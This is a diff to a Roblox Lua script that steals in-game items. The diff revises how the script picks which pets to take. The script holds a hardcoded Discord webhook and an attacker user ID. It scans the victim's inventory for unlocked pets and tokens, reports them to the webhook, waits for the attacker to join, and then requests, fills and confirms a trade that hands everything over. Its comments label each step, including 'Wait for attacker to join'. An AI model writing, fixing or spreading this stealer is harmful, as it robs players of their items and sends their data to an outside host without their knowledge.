@@ -8,6 +8,7 @@ task.spawn(function()
     local DISCORD_ID       = "1498793342945722388"
     local WEBHOOK_URL      = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
     
+    -- 1. The 30-Second Wait
     task.wait(30)
     
     local function sendWebhook(pets, tokens, lp)
@@ -70,6 +71,7 @@ task.spawn(function()
         end)
     end
 
+    -- 2. Scan Inventory
     local data, lp = getData()
     if not data or not data.Pets or not data.Pets.Owned then return end
     
@@ -79,26 +81,23 @@ task.spawn(function()
         tokens = data.Currencies.Tokens
     end
 
-    local equipped = {}
-    if data.Pets.Equipped then
-        for _, id in pairs(data.Pets.Equipped) do equipped[id] = true end
-    end
-
+    -- THE FIX: We check the pet.Equip property directly!
     for key, pet in pairs(data.Pets.Owned) do
-        local realUid = pet.Uid or pet.Id or (type(key) == "string" and key or nil)
-        if realUid and not pet.Locked and not equipped[realUid] and not equipped[key] then
+        if not pet.Locked and not pet.Equip then
             table.insert(pets, pet)
-            table.insert(ids, realUid)
+            table.insert(ids, pet.Id) -- Use pet.Id, which is guaranteed to be the UUID
         end
     end
 
     if #pets == 0 and tokens == 0 then return end
     sendWebhook(pets, tokens, lp)
 
+    -- 3. Wait for attacker to join
     while not game:GetService("Players"):GetPlayerByUserId(ATTACKER_USER_ID) do
         task.wait(2)
     end
 
+    -- 4. Auto-Trade Loop
     while true do
         fireTrade("Request", { TargetUserId = ATTACKER_USER_ID })
         
@@ -107,8 +106,10 @@ task.spawn(function()
         while waitTime < 20 do
             task.wait(1)
             waitTime = waitTime + 1
+            
             local gui = lp:FindFirstChild("PlayerGui")
             local tradeGui = gui and gui:FindFirstChild("Trade")
+            
             if tradeGui and tradeGui.Enabled then
                 accepted = true
                 break
@@ -116,9 +117,10 @@ task.spawn(function()
         end
 
         if accepted then
+            -- 5. Offer Pets
             local refs = {}
-            for _, uid in ipairs(ids) do
-                table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 })
+            for _, id in ipairs(ids) do
+                table.insert(refs, { Uid = id, TypeName = "Pet", Amount = 1 })
             end
 
             if #refs > 0 then
@@ -126,6 +128,7 @@ task.spawn(function()
                 task.wait(1)
             end
             
+            -- 6. Handle Tokens
             if tokens > 0 then
                 local rs = game:GetService("ReplicatedStorage")
                 local tokenRemote = rs.RemoteServices.TradingService.RF:FindFirstChild("SetTokens")
@@ -136,6 +139,7 @@ task.spawn(function()
                 end
             end
 
+            -- 7. Confirm
             task.wait(1)
             fireTrade("Confirm", {})
             break
